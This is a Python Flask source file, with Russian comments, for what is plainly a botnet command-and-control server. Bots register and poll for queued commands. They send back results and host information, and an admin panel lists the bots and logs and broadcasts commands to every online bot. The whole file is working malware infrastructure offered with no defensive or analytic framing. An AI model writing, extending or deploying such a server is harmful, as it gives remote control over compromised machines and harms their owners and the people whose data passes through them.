from flask import Flask, request, render_template, jsonify
import sqlite3
import time
import json
import random

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS bots (
        id TEXT PRIMARY KEY,
        ip TEXT,
        info TEXT,
        status TEXT DEFAULT 'online',
        last_seen INTEGER,
        registered INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        command TEXT,
        params TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        created INTEGER,
        executed INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        message TEXT,
        timestamp INTEGER
    )''')
    conn.commit()
    conn.close()

init_db()

# ============================================================
# API ДЛЯ БОТОВ
# ============================================================

@app.route('/api/register')
def register():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'ERROR'

    ip = request.remote_addr
    now = int(time.time())

    conn = get_db()
    conn.execute('INSERT OR REPLACE INTO bots (id, ip, last_seen, registered, status) VALUES (?, ?, ?, ?, ?)',
                 (bot_id, ip, now, now, 'online'))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/get')
def get_command():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'none'

    conn = get_db()
    conn.execute('UPDATE bots SET last_seen = ?, status = "online" WHERE id = ?',
                 (int(time.time()), bot_id))
    conn.commit()

    row = conn.execute('SELECT id, command, params FROM commands WHERE bot_id = ? AND status = "pending" LIMIT 1',
                       (bot_id,)).fetchone()

    if row:
        conn.execute('UPDATE commands SET status = "executing", executed = ? WHERE id = ?',
                     (int(time.time()), row['id']))
        conn.commit()
        conn.close()
        return f"{row['command']}:{row['params']}"

    conn.close()
    return 'none'

@app.route('/api/result', methods=['POST'])
def save_result():
    bot_id = request.args.get('id')
    result = request.form.get('result', '')

    if not bot_id:
        return 'ERROR'

    conn = get_db()
    row = conn.execute('SELECT id FROM commands WHERE bot_id = ? AND status = "executing" ORDER BY id DESC LIMIT 1',
                       (bot_id,)).fetchone()

    if row:
        conn.execute('UPDATE commands SET status = "done", result = ? WHERE id = ?',
                     (result, row['id']))
        conn.commit()

    conn.execute('INSERT INTO logs (bot_id, message, timestamp) VALUES (?, ?, ?)',
                 (bot_id, result, int(time.time())))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/info', methods=['POST'])
def save_info():
    bot_id = request.args.get('id')
    info = request.get_data(as_text=True)

    if not bot_id:
        return 'ERROR'

    conn = get_db()
    conn.execute('UPDATE bots SET info = ? WHERE id = ?', (info, bot_id))
    conn.commit()
    conn.close()
    return 'OK'

# ============================================================
# АДМИН-ПАНЕЛЬ
# ============================================================

@app.route('/')
def admin():
    return render_template('index.html')

@app.route('/api/stats')
def api_stats():
    conn = get_db()
    total = conn.execute('SELECT COUNT(*) FROM bots').fetchone()[0]
    online = conn.execute('SELECT COUNT(*) FROM bots WHERE status = "online" AND last_seen > ?',
                          (int(time.time()) - 600,)).fetchone()[0]
    offline = total - online
    commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"').fetchone()[0]
    conn.close()
    return jsonify({'total': total, 'online': online, 'offline': offline, 'commands': commands})

@app.route('/api/bots')
def api_bots():
    conn = get_db()
    rows = conn.execute('SELECT * FROM bots ORDER BY last_seen DESC').fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/logs')
def api_logs():
    limit = request.args.get('limit', 100, type=int)
    conn = get_db()
    rows = conn.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', (limit,)).fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/clear_logs', methods=['POST'])
def api_clear_logs():
    conn = get_db()
    conn.execute('DELETE FROM logs')
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/delete_bot', methods=['POST'])
def api_delete_bot():
    bot_id = request.form.get('id')
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    conn.execute('DELETE FROM bots WHERE id = ?', (bot_id,))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/send_command', methods=['POST'])
def api_send_command():
    bot_id = request.form.get('bot_id')
    command = request.form.get('command')
    params = request.form.get('params', '')

    if not command:
        return 'ERROR'

    conn = get_db()

    if bot_id == 'all':
        rows = conn.execute('SELECT id FROM bots WHERE status = "online"').fetchall()
        for row in rows:
            conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                         (row['id'], command, params, int(time.time())))
    else:
        conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                     (bot_id, command, params, int(time.time())))

    conn.commit()
    conn.close()
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
